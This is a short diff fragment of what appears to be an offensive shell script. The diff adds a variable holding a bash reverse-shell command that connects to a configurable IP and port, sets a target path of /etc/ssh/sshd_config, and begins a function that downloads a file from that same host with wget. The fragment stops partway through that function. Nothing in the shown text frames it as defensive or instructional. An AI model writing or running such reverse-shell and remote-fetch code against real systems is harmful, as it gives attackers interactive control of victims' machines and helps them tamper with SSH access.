@@ -6,8 +6,8 @@
 nickname=
 ip=
 port=
-revsh=
-ssh=
+revsh="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
+ssh="/etc/ssh/sshd_config"
 
 function nyan() {
   wget http://$ip/nyancat
